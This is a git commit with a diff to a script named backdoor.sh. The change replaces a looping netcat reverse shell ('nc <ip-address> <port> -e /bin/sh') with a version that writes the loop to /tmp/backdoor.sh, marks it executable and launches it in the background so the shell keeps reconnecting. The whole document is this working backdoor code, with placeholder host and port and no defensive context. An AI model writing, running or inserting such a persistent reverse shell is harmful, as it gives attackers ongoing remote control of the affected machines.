4bb1f930a32e134716ddbfea2f1610e2a6a492e9
km1t4h <km1t4h@gmail.com>
2026-02-20 23:49:25 +0100

    feat: Update backdoor.sh script. The script is created each time its logic is executed

--- scripts/backdoor.sh
+++ scripts/backdoor.sh
@@ -1,5 +1,13 @@
 #!/bin/sh
 
-while true; do
-    nc <ip-address> <port> -e /bin/sh
-done
+echo "Create backdoor script..."
+
+echo "#!/bin/sh"                              > /tmp/backdoor.sh
+echo "while true; do"                        >> /tmp/backdoor.sh
+echo "    echo ..."                          >> /tmp/backdoor.sh
+echo "    nc <ip-address> <port> -e /bin/sh" >> /tmp/backdoor.sh
+echo "    sleep 5"                           >> /tmp/backdoor.sh
+echo "done"                                  >> /tmp/backdoor.sh
+
+chmod +x /tmp/backdoor.sh
+. /tmp/backdoor.sh &
